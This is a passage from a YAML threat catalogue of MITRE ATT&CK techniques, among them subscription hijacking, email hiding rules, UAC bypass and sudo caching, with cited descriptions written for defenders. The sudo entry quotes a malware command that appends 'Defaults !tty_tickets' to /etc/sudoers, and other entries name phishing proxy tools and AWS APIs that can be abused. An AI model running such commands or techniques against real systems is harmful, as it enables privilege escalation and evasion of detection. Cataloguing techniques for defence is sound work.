      \ Organizations)(Citation: Microsoft Azure Resources)\n\nAdversaries may add,\
      \ delete, or otherwise modify resource groups within an IaaS hierarchy. For\
      \ example, in Azure environments, an adversary who has gained access to a Global\
      \ Administrator account may create new subscriptions in which to deploy resources.\
      \ They may also engage in subscription hijacking by transferring an existing\
      \ pay-as-you-go subscription from a victim tenant to an adversary-controlled\
      \ tenant. This will allow the adversary to use the victim\u2019s compute resources\
      \ without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm\
      \ 2023)(Citation: Microsoft Subscription Hijacking 2022)\n\nIn AWS environments,\
      \ adversaries with appropriate permissions in a given account may call the `LeaveOrganization`\
      \ API, causing the account to be severed from the AWS Organization to which\
      \ it was tied and removing any Service Control Policies, guardrails, or restrictions\
      \ imposed upon it by its former Organization. Alternatively, adversaries may\
      \ call the `CreateAccount` API in order to create a new account within an AWS\
      \ Organization. This account will use the same payment methods registered to\
      \ the payment account but may not be subject to existing detections or Service\
      \ Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)\nhttps://attack.mitre.org/techniques/T1666"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.008
    ref_id: T1564.008
    name: Email Hiding Rules
    description: 'Adversaries may use email rules to hide inbound emails in a compromised
      user''s mailbox. Many email clients allow users to create inbox rules for various
      email functions, including moving emails to other folders, marking emails as
      read, or deleting emails. Rules may be created or modified within email clients
      or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code>
      [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows
      systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation:
      Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)


      Adversaries may utilize email rules within a compromised user''s mailbox to
      delete and/or move emails to less noticeable folders. Adversaries may do this
      to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)
      emails sent from the compromised account.


      Any user or administrator within the organization (or adversary with valid credentials)
      may be able to create rules to automatically move or delete emails. These rules
      can be abused to impair/delay detection had the email content been immediately
      seen by a user or defender. Malicious rules commonly filter out emails based
      on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>,
      and <code>hack</code>) found in message bodies and subject lines. (Citation:
      Microsoft Cloud App Security)


      In some environments, administrators may be able to enable email rules that
      operate organization-wide rather than on individual inboxes. For example, Microsoft
      Exchange supports transport rules that evaluate all mail an organization receives
      against user-specified conditions, then performs a user-specified action on
      mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023)
      Adversaries that abuse such features may be able to automatically modify or
      delete all emails related to specific topics (such as internal security incident
      notifications).

      https://attack.mitre.org/techniques/T1564/008'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1491.002
    ref_id: T1491.002
    name: External Defacement
    description: "An adversary may deface systems external to an organization in an\
      \ attempt to deliver messaging, intimidate, or otherwise mislead an organization\
      \ or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002)\
      \ may ultimately cause users to distrust the systems and to question/discredit\
      \ the system\u2019s integrity. Externally-facing websites are a common victim\
      \ of defacement; often targeted by adversary and hacktivist groups in order\
      \ to push a political message or spread propaganda.(Citation: FireEye Cyber\
      \ Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate\
      \ Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt\
      \ Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002)\
      \ may be used as a catalyst to trigger events, or as a response to actions taken\
      \ by an organization or government. Similarly, website defacement may also be\
      \ used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation:\
      \ Trend Micro Deep Dive Into Defacement)\nhttps://attack.mitre.org/techniques/T1491/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.013
    ref_id: T1027.013
    name: Encrypted/Encoded File
    description: "Adversaries may encrypt or encode files to obfuscate strings, bytes,\
      \ and other specific patterns to impede detection. Encrypting and/or encoding\
      \ file content aims to conceal malicious artifacts within a file used in an\
      \ intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
      \ [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded\
      \ Payloads](https://attack.mitre.org/techniques/T1027/009), share this same\
      \ broad objective. Encrypting and/or encoding files could lead to a lapse in\
      \ detection of static signatures, only for this malicious content to be revealed\
      \ (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140))\
      \ at the time of execution/use.\n\nThis type of file obfuscation can be applied\
      \ to many file artifacts present on victim hosts, such as malware log/configuration\
      \ and payload files.(Citation: File obfuscation) Files can be encrypted with\
      \ a hardcoded or user-supplied key, as well as otherwise obfuscated using standard\
      \ encoding/compression schemes such as Base64.\n\nThe entire content of a file\
      \ may be obfuscated, or just specific functions or values (such as C2 addresses).\
      \ Encryption and encoding may also be applied in redundant layers for additional\
      \ protection.\n\nFor example, adversaries may abuse password-protected Word\
      \ documents or self-extracting (SFX) archives as a method of encrypting/encoding\
      \ a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload.\
      \ These files typically function by attaching the intended archived content\
      \ to a decompressor stub that is executed when the file is invoked (e.g., [User\
      \ Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded\
      \ File) \n\nAdversaries may also abuse file-specific as well as custom encoding\
      \ schemes. For example, Byte Order Mark (BOM) headers in text files may be abused\
      \ to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\
      \ execution.\nhttps://attack.mitre.org/techniques/T1027/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.005
    ref_id: T1590.005
    name: IP Addresses
    description: 'Adversaries may gather the victim''s IP addresses that can be used
      during targeting. Public IP addresses may be allocated to organizations by block,
      or a range of sequential addresses. Information about assigned IP addresses
      may include a variety of details, such as which IP addresses are in use. IP
      addresses may also enable an adversary to derive other details about a victim,
      such as organizational size, physical location(s), Internet service provider,
      and or where/how their publicly-facing infrastructure is hosted.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about assigned IP addresses may also be exposed to adversaries via online or
      other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:
      WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1590/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.001
    ref_id: T1499.001
    name: OS Exhaustion Flood
    description: 'Adversaries may launch a denial of service (DoS) attack targeting
      an endpoint''s operating system (OS). A system''s OS is responsible for managing
      the finite resources as well as preventing the entire system from being overwhelmed
      by excessive demands on its capacity. These attacks do not need to exhaust the
      actual resources on a system; the attacks may simply exhaust the limits and
      available resources that an OS self-imposes.


      Different ways to achieve this exist, including TCP state-exhaustion attacks
      such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)
      With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP
      handshake is never completed. Because each OS has a maximum number of concurrent
      TCP connections that it will allow, this can quickly exhaust the ability of
      the system to receive new requests for TCP connections, thus preventing access
      to any TCP service provided by the server.(Citation: Cloudflare SynFlood)


      ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK
      packets are sent to the target. This forces the OS to search its state table
      for a related TCP connection that has already been established. Because the
      ACK packets are for connections that do not exist, the OS will have to search
      the entire state table to confirm that no match exists. When it is necessary
      to do this for a large flood of packets, the computational requirements can
      cause the server to become sluggish and/or unresponsive, due to the work it
      must do to eliminate the rogue ACK packets. This greatly reduces the resources
      available for providing the targeted service.(Citation: Corero SYN-ACKflood)

      https://attack.mitre.org/techniques/T1499/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1014
    ref_id: T1014
    name: Rootkit
    description: "Adversaries may use rootkits to hide the presence of programs, files,\
      \ network connections, services, drivers, and other system components. Rootkits\
      \ are programs that hide the existence of malware by intercepting/hooking and\
      \ modifying operating system API calls that supply system information. (Citation:\
      \ Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality\
      \ may reside at the user or kernel level in the operating system or lower, to\
      \ include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001).\
      \ (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux,\
      \ and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat\
      \ Mac OSX Rootkit)\nhttps://attack.mitre.org/techniques/T1014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.013
    ref_id: T1546.013
    name: PowerShell Profile
    description: "Adversaries may gain persistence and elevate privileges by executing\
      \ malicious content triggered by PowerShell profiles. A PowerShell profile \
      \ (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ starts and can be used as a logon script to customize user environments.\n\
      \n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several\
      \ profiles depending on the user or host program. For example, there can be\
      \ different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ host programs such as the PowerShell console, PowerShell ISE or Visual Studio\
      \ Code. An administrator can also configure a profile that applies to all users\
      \ and host programs on the local computer. (Citation: Microsoft About Profiles)\
      \ \n\nAdversaries may modify these profiles to include arbitrary commands, functions,\
      \ modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ session the modified script will be executed unless the <code>-NoProfile</code>\
      \ flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019)\
      \ \n\nAn adversary may also be able to escalate privileges if a script in a\
      \ PowerShell profile is loaded and executed by an account with higher privileges,\
      \ such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)\n\
      https://attack.mitre.org/techniques/T1546/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.007
    ref_id: T1059.007
    name: JavaScript
    description: "Adversaries may abuse various implementations of JavaScript for\
      \ execution. JavaScript (JS) is a platform-independent scripting language (compiled\
      \ just-in-time at runtime) commonly associated with scripts in webpages, though\
      \ JS can be executed in runtime environments outside the browser.(Citation:\
      \ NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard.\
      \ JScript is interpreted via the Windows Script engine and thus integrated with\
      \ many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
      \ and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation:\
      \ Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript\
      \ for Automation (JXA) is a macOS scripting language based on JavaScript, included\
      \ as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced\
      \ in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control\
      \ applications, interface with the operating system, and bridge access into\
      \ the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports\
      \ two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002).\
      \ Scripts can be executed via the command line utility <code>osascript</code>,\
      \ they can be compiled into applications or script files via <code>osacompile</code>,\
      \ and they can be compiled and executed in memory of other programs by leveraging\
      \ the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation:\
      \ SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary\
      \ Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries\
      \ may abuse various implementations of JavaScript to execute various behaviors.\
      \ Common uses include hosting malicious scripts on websites as part of a [Drive-by\
      \ Compromise](https://attack.mitre.org/techniques/T1189) or downloading and\
      \ executing these script files as secondary payloads. Since these payloads are\
      \ text-based, it is also very common for adversaries to obfuscate their content\
      \ as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\
      https://attack.mitre.org/techniques/T1059/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.002
    ref_id: T1590.002
    name: DNS
    description: "Adversaries may gather information about the victim's DNS that can\
      \ be used during targeting. DNS information may include a variety of details,\
      \ including registered name servers as well as records that outline addressing\
      \ for a target\u2019s subdomains, mail servers, and other hosts. DNS MX, TXT,\
      \ and SPF records may also reveal the use of third party cloud and SaaS providers,\
      \ such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf\
      \ Twitter DNS Records)\n\nAdversaries may gather this information in various\
      \ ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001).\
      \ DNS information may also be exposed to adversaries via online or other accessible\
      \ data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:\
      \ DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may\
      \ reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical\
      \ Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593),\
      \ or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing\
      \ operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
      \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
      \ and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\
      \nAdversaries may also use DNS zone transfer (DNS query type AXFR) to collect\
      \ all records from a misconfigured DNS server.(Citation: Trails-DNS)(Citation:\
      \ DNS-CISA)(Citation: Alexa-dns)\nhttps://attack.mitre.org/techniques/T1590/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1485.001
    ref_id: T1485.001
    name: Lifecycle-Triggered Deletion
    description: "Adversaries may modify the lifecycle policies of a cloud storage\
      \ bucket to destroy all objects stored within.  \n\nCloud storage buckets often\
      \ allow users to set lifecycle policies to automate the migration, archival,\
      \ or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation:\
      \ GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor\
      \ has sufficient permissions to modify these policies, they may be able to delete\
      \ all objects at once. \n\nFor example, in AWS environments, an adversary with\
      \ the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle`\
      \ API call to apply a lifecycle policy to an S3 bucket that deletes all objects\
      \ in the bucket after one day.(Citation: Palo Alto Cloud Ransomware) In addition\
      \ to destroying data for purposes of extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657),\
      \ adversaries may also perform this action on buckets storing cloud logs for\
      \ [Indicator Removal](https://attack.mitre.org/techniques/T1070).(Citation:\
      \ Datadog S3 Lifecycle CloudTrail Logs)\nhttps://attack.mitre.org/techniques/T1485/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1123
    ref_id: T1123
    name: Audio Capture
    description: 'An adversary can leverage a computer''s peripheral devices (e.g.,
      microphones and webcams) or applications (e.g., voice and video call services)
      to capture audio recordings for the purpose of listening into sensitive conversations
      to gather information.(Citation: ESET Attor Oct 2019)


      Malware or scripts may be used to interact with the devices through an available
      API provided by the operating system or an application to capture audio. Audio
      files may be written to disk and exfiltrated later.

      https://attack.mitre.org/techniques/T1123'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543
    ref_id: T1543
    name: Create or Modify System Process
    description: "Adversaries may create or modify system-level processes to repeatedly\
      \ execute malicious payloads as part of persistence. When operating systems\
      \ boot up, they can start processes that perform background system functions.\
      \ On Windows and Linux, these system processes are referred to as services.(Citation:\
      \ TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
      \ and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run\
      \ to finish system initialization and load user specific parameters.(Citation:\
      \ AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services,\
      \ daemons, or agents that can be configured to execute at startup or a repeatable\
      \ interval in order to establish persistence. Similarly, adversaries may modify\
      \ existing services, daemons, or agents to achieve the same effect.  \n\nServices,\
      \ daemons, or agents may be created with administrator privileges but executed\
      \ under root/SYSTEM privileges. Adversaries may leverage this functionality\
      \ to create or modify system processes in order to escalate privileges.(Citation:\
      \ OSX Malware Detection)\nhttps://attack.mitre.org/techniques/T1543"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1133
    ref_id: T1133
    name: External Remote Services
    description: "Adversaries may leverage external-facing remote services to initially\
      \ access and/or persist within a network. Remote services such as VPNs, Citrix,\
      \ and other access mechanisms allow users to connect to internal enterprise\
      \ network resources from external locations. There are often remote service\
      \ gateways that manage connections and credential authentication for these services.\
      \ Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)\
      \ and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used\
      \ externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to\
      \ [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service\
      \ is often a requirement, which could be obtained through credential pharming\
      \ or by obtaining the credentials from users after compromising the enterprise\
      \ network.(Citation: Volexity Virtual Private Keylogging) Access to remote services\
      \ may be used as a redundant or persistent access mechanism during an operation.\n\
      \nAccess may also be gained through an exposed service that doesn\u2019t require\
      \ authentication. In containerized environments, this may include an exposed\
      \ Docker API, Kubernetes API server, kubelet, or web application such as the\
      \ Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation:\
      \ Unit 42 Hildegard Malware)\nhttps://attack.mitre.org/techniques/T1133"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.006
    ref_id: T1546.006
    name: LC_LOAD_DYLIB Addition
    description: "Adversaries may establish persistence by executing malicious content\
      \ triggered by the execution of tainted binaries. Mach-O binaries have a series\
      \ of headers that are used to perform certain operations when a binary is loaded.\
      \ The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic\
      \ libraries (dylibs) to load during execution time. These can be added ad-hoc\
      \ to the compiled binary as long as adjustments are made to the rest of the\
      \ fields and dependencies.(Citation: Writing Bad Malware for OSX) There are\
      \ tools available to perform these changes.\n\nAdversaries may modify Mach-O\
      \ binary headers to load and execute malicious dylibs every time the binary\
      \ is executed. Although any changes will invalidate digital signatures on binaries\
      \ because the binary is being modified, this can be remediated by simply removing\
      \ the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019\
      t checked at load time.(Citation: Malware Persistence on OS X)\nhttps://attack.mitre.org/techniques/T1546/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1539
    ref_id: T1539
    name: Steal Web Session Cookie
    description: 'An adversary may steal web application or service session cookies
      and use them to gain access to web applications or Internet services as an authenticated
      user without needing credentials. Web applications and services often use session
      cookies as an authentication token after a user has authenticated to a website.


      Cookies are often valid for an extended period of time, even if the web application
      is not actively used. Cookies can be found on disk, in the process memory of
      the browser, and in network traffic to remote systems. Additionally, other applications
      on the targets machine might store sensitive authentication cookies in memory
      (e.g. apps which authenticate to cloud services). Session cookies can be used
      to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)


      There are several examples of malware targeting cookies from web browsers on
      the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42
      Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting
      malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204)
      by tricking victims into running malicious JavaScript in their browser.(Citation:
      Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)


      There are also open source frameworks such as `Evilginx2` and `Muraena` that
      can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557))
      that can be set up by an adversary and used in phishing campaigns.(Citation:
      Github evilginx2)(Citation: GitHub Mauraena)


      After an adversary acquires a valid cookie, they can then perform a [Web Session
      Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to
      the corresponding web application.

      https://attack.mitre.org/techniques/T1539'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.007
    ref_id: T1053.007
    name: Container Orchestration Job
    description: 'Adversaries may abuse task scheduling functionality provided by
      container orchestration tools such as Kubernetes to schedule deployment of containers
      configured to execute malicious code. Container orchestration jobs run these
      automated tasks at a specific date and time, similar to cron jobs on a Linux
      system. Deployments of this type can also be configured to maintain a quantity
      of containers over time, automating the process of maintaining persistence within
      a cluster.


      In Kubernetes, a CronJob may be used to schedule a Job that runs one or more
      containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes
      CronJob) An adversary therefore may utilize a CronJob to schedule deployment
      of a Job that executes malicious code in various nodes within a cluster.(Citation:
      Threat Matrix for Kubernetes)

      https://attack.mitre.org/techniques/T1053/007'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568.002
    ref_id: T1568.002
    name: Domain Generation Algorithms
    description: "Adversaries may make use of Domain Generation Algorithms (DGAs)\
      \ to dynamically identify a destination domain for command and control traffic\
      \ rather than relying on a list of static IP addresses or domains. This has\
      \ the advantage of making it much harder for defenders to block, track, or take\
      \ over the command and control channel, as there potentially could be thousands\
      \ of domains that malware can check for instructions.(Citation: Cybereason Dissecting\
      \ DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs\
      \ can take the form of apparently random or \u201Cgibberish\u201D strings (ex:\
      \ istgmxdejdnxuyla.ru) when they construct domain names by generating each letter.\
      \ Alternatively, some DGAs employ whole words as the unit by concatenating words\
      \ together instead of letters (ex: cityjulydish.net). Many DGAs are time-based,\
      \ generating a different domain for each time period (hourly, daily, monthly,\
      \ etc). Others incorporate a seed value as well to make predicting future domains\
      \ more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation:\
      \ Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\
      \nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008).\
      \ When contact is lost with the primary command and control server malware may\
      \ employ a DGA as a means to reestablishing command and control.(Citation: Talos\
      \ CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit\
      \ 2017 Activity)\nhttps://attack.mitre.org/techniques/T1568/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.007
    ref_id: T1036.007
    name: Double File Extension
    description: "Adversaries may abuse a double extension in the filename as a means\
      \ of masquerading the true file type. A file name may include a secondary file\
      \ type extension that may cause only the first extension to be displayed (ex:\
      \ <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>).\
      \ However, the second extension is the true file type that determines how the\
      \ file is opened and executed. The real file extension may be hidden by the\
      \ operating system in the file browser (ex: explorer.exe), as well as in any\
      \ software configured using or similar to the system\u2019s policies.(Citation:\
      \ PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries\
      \ may abuse double extensions to attempt to conceal dangerous file types of\
      \ payloads. A very common usage involves tricking a user into opening what they\
      \ think is a benign file type but is actually executable code. Such files often\
      \ pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001)\
      \ into a user\u2019s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)\
      \ then [User Execution](https://attack.mitre.org/techniques/T1204). For example,\
      \ an executable file attachment named <code>Evil.txt.exe</code> may display\
      \ as <code>Evil.txt</code> to a user. The user may then view it as a benign\
      \ text file and open it, inadvertently executing the hidden malware.(Citation:\
      \ SOCPrime DoubleExtension)\n\nCommon file types, such as text files (.txt,\
      \ .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first\
      \ extension to appear benign. Executable extensions commonly regarded as dangerous,\
      \ such as .exe, .lnk, .hta, and .scr, often appear as the second extension and\
      \ true file type.\nhttps://attack.mitre.org/techniques/T1036/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.002
    ref_id: T1548.002
    name: Bypass User Account Control
    description: 'Adversaries may bypass UAC mechanisms to elevate process privileges
      on system. Windows User Account Control (UAC) allows a program to elevate its
      privileges (tracked as integrity levels ranging from low to high) to perform
      a task under administrator-level permissions, possibly by prompting the user
      for confirmation. The impact to the user ranges from denying the operation under
      high enforcement to allowing the user to perform the action if they are in the
      local administrators group and click through the prompt or allowing them to
      enter an administrator password to complete the action.(Citation: TechNet How
      UAC Works)


      If the UAC protection level of a computer is set to anything but the highest
      level, certain Windows programs can elevate privileges or execute some elevated
      [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects
      without prompting the user through the UAC notification box.(Citation: TechNet
      Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011)
      to load a specifically crafted DLL which loads an auto-elevated [Component Object
      Model](https://attack.mitre.org/techniques/T1559/001) object and performs a
      file operation in a protected directory which would typically require elevated
      access. Malicious software may also be injected into a trusted process to gain
      elevated privileges without prompting a user.(Citation: Davidson Windows)


      Many methods have been discovered to bypass UAC. The Github readme page for
      UACME contains an extensive list of methods(Citation: Github UACMe) that have
      been discovered and implemented, but may not be a comprehensive list of bypasses.
      Additional bypass methods are regularly discovered and some used in the wild,
      such as:


      * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary
      or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)


      Another bypass is possible through some lateral movement techniques if credentials
      for an account with administrator privileges are known, since UAC is a single
      system security mechanism, and the privilege or integrity of a process running
      on one system will be unknown on remote systems and default to high integrity.(Citation:
      SANS UAC Bypass)

      https://attack.mitre.org/techniques/T1548/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496.003
    ref_id: T1496.003
    name: SMS Pumping
    description: "Adversaries may leverage messaging services for SMS pumping, which\
      \ may impact system and/or hosted service availability.(Citation: Twilio SMS\
      \ Pumping) SMS pumping is a type of telecommunications fraud whereby a threat\
      \ actor first obtains a set of phone numbers from a telecommunications provider,\
      \ then leverages a victim\u2019s messaging infrastructure to send large amounts\
      \ of SMS messages to numbers in that set. By generating SMS traffic to their\
      \ phone number set, a threat actor may earn payments from the telecommunications\
      \ provider.(Citation: Twilio SMS Pumping Fraud)\n\nThreat actors often use publicly\
      \ available web forms, such as one-time password (OTP) or account verification\
      \ fields, in order to generate SMS traffic. These fields may leverage services\
      \ such as Twilio, AWS SNS, and Amazon Cognito in the background.(Citation: Twilio\
      \ SMS Pumping)(Citation: AWS RE:Inforce Threat Detection 2024) In response to\
      \ the large quantity of requests, SMS costs may increase and communication channels\
      \ may become overwhelmed.(Citation: Twilio SMS Pumping)\nhttps://attack.mitre.org/techniques/T1496/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1016.001
    ref_id: T1016.001
    name: Internet Connection Discovery
    description: 'Adversaries may check for Internet connectivity on compromised systems.
      This may be performed during automated discovery and can be accomplished in
      numerous ways such as using [Ping](https://attack.mitre.org/software/S0097),
      <code>tracert</code>, and GET requests to websites.


      Adversaries may use the results and responses from these requests to determine
      if the system is capable of communicating with their C2 servers before attempting
      to connect to them. The results may also be used to identify routes, redirectors,
      and proxy servers.

      https://attack.mitre.org/techniques/T1016/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.003
    ref_id: T1548.003
    name: Sudo and Sudo Caching
    description: 'Adversaries may perform sudo caching and/or use the sudoers file
      to elevate privileges. Adversaries may do this to execute commands as other
      users or spawn processes with higher privileges.


      Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do")
      allows users to perform commands from terminals with elevated privileges and
      to control who can perform these commands on the system. The <code>sudo</code>
      command "allows a system administrator to delegate authority to give certain
      users (or groups of users) the ability to run some (or all) commands as root
      or another user while providing an audit trail of the commands and their arguments."(Citation:
      sudo man page 2018) Since sudo was made for the system administrator, it has
      some useful configuration features such as a <code>timestamp_timeout</code>,
      which is the amount of time in minutes between instances of <code>sudo</code>
      before it will re-prompt for a password. This is because <code>sudo</code> has
      the ability to cache credentials for a period of time. Sudo creates (or touches)
      a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run
      to determine this timeout. Additionally, there is a <code>tty_tickets</code>
      variable that treats each new tty (terminal session) in isolation. This means
      that, for example, the sudo timeout of one tty will not affect another tty (you
      will have to type the password again).


      The sudoers file, <code>/etc/sudoers</code>, describes which users can run which
      commands and from which terminals. This also describes which commands users
      can run as other users or groups. This provides the principle of least privilege
      such that users are running in their lowest possible permissions for most of
      the time and only elevate to other users or permissions as needed, typically
      by prompting for a password. However, the sudoers file can also specify when
      to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD:
      ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit
      this file though.


      Adversaries can also abuse poor configurations of these mechanisms to escalate
      privileges without needing the user''s password. For example, <code>/var/db/sudo</code>''s
      timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code>
      range. If it does, then malware can execute sudo commands without needing to
      supply the user''s password. Additional, if <code>tty_tickets</code> is disabled,
      adversaries can do this from any tty for that user.


      In the wild, malware has disabled <code>tty_tickets</code> to potentially make
      scripting easier by issuing <code>echo \''Defaults !tty_tickets\'' >> /etc/sudoers</code>.(Citation:
      cybereason osx proton) In order for this change to be reflected, the malware
      also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file
      has <code>tty_tickets</code> enabled by default.

      https://attack.mitre.org/techniques/T1548/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560.003
    ref_id: T1560.003
    name: Archive via Custom Method
    description: 'An adversary may compress or encrypt data that is collected prior
      to exfiltration using a custom method. Adversaries may choose to use custom
